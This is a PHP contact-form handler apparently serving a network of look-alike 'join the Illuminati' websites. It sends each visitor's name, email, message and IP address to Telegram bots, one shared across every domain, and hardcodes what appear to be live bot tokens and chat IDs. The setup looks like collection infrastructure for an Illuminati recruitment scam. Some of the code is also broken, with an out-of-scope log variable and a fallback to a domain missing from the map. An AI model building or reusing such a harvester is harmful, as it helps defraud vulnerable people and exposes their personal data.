<?php
// =============================================
// 🔐 ILLUMINATI CONTACT FORM SUBMISSION SCRIPT
// =============================================

// === Domain-specific bot + redirect map ===
$site_map = [
    'illuminatiofficial.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        "redirect" => "https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],




    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],





    'illuminatilight.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
        ],
        "redirect" => "https://illuminatilight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],





    'illuminatipathtolight.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
        ],
        "redirect" => "https://illuminatipathtolight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],



    
    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


    
    'submitt.onrender.com' => [
        'bots' => [
            ['token' => 'YOUR_BOT_TOKEN_HERE', 'chat_id' => 'YOUR_CHAT_ID_HERE'],
        ],
        'redirect' => 'https://illuminatiofficial.org/thank-you/'
    ],
    // Add more domains as needed
];

// === Logger setup ===
$log_file = __DIR__ . '/submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === HTML escape function for Telegram ===
function escape_html($text) {
    return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8', false);
}

// === Telegram sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        
        // Error logging
        if (curl_error($ch)) {
            logToFile("❌ Telegram cURL error: " . curl_error($ch), $log_file);
        } else {
            $response = json_decode($result, true);
            if (!isset($response['ok']) || $response['ok'] !== true) {
                logToFile("❌ Telegram API Error: " . ($response['description'] ?? 'Unknown Error'), $log_file);
            }
        }
        curl_close($ch);
    }
}

// === Main logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // === Extract and sanitize VISIBLE form fields ===
    $first_name = escape_html($_POST['first_name'] ?? 'Not provided');
    $last_name = escape_html($_POST['last_name'] ?? 'Not provided');
    $full_name = trim("$first_name $last_name");
    
    $email = escape_html($_POST['email'] ?? 'Not provided');
    $message = escape_html($_POST['message'] ?? 'Not provided');
    
    // Checkbox handling (visible field)
    $terms_agreed = isset($_POST['termsagree']) && is_array($_POST['termsagree']) 
        ? '✅ Yes' 
        : '❌ No';
    
    // === Get IP and timestamp ===
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    $timestamp = date("Y-m-d H:i:s");
    
    // === Get domain for verification ===
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed = parse_url($referer);
    $domain = $parsed['host'] ?? 'unknown';
    
    // === Create Telegram message ===
    $message_preview = strlen($message) > 200 ? substr($message, 0, 200) . "..." : $message;
    
    $telegram_msg = "🔺 <b>New Illuminati Contact Form Submission</b>\n\n" .
                   "👤 <b>Name:</b> $full_name\n" .
                   "📧 <b>Email:</b> $email\n" .
                   "📝 <b>Message:</b> $message_preview\n" .
                   "✅ <b>Terms Agreed:</b> $terms_agreed\n\n" .
                   "🕒 <b>Time:</b> $timestamp\n" .
                   "🌐 <b>IP:</b> $ip\n" .
                   "🔗 <b>Domain:</b> $domain";
    
    // Add full message if truncated
    if (strlen($message) > 200) {
        $telegram_msg .= "\n\n<b>📋 Full Message:</b>\n$message";
    }
    
    // === Log and send ===
    logToFile("[$domain] Contact form from: $full_name ($email)", $log_file);
    
    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($telegram_msg, $config['bots']);
        
        // Redirect to thank you page
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        
        // Fallback - still send to first bot if unauthorized domain
        if (!empty($site_map['illuminatiofficial.org'])) {
            sendToBots($telegram_msg . "\n\n⚠️ <b>Warning:</b> From unauthorized domain: $domain", 
                      $site_map['illuminatiofficial.org']['bots']);
        }
        
        // Redirect anyway
        header("Location: https://illuminatiofficial.org/thank-you/");
        exit;
    }
} else {
    // Not a POST request
    http_response_code(405);
    exit("Method not allowed");
}
?>
